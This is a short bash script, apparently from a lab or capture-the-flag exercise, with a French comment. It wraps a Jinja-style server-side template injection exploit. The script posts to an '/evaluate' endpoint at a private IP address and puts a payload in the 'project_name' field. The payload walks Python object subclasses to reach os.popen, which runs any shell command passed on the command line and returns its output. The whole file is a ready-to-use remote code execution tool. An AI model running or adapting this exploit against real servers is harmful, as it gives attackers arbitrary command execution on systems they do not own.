#!/bin/bash

if [ "$#" -eq 0 ]; then
    echo "Usage: $0 \"commande shell\""
    exit 1
fi

COMMAND="$*"

# si vous reutilisez, bien modifier l'ip
curl -s -X POST http://10.0.2.2:5042/evaluate \
    -H "X-Debug-Render: true" \
    --data-urlencode "project_name={{ \"\".__class__.__mro__[1].__subclasses__()[540].__init__.__globals__[\"os\"].popen(\"$COMMAND\").read() }}"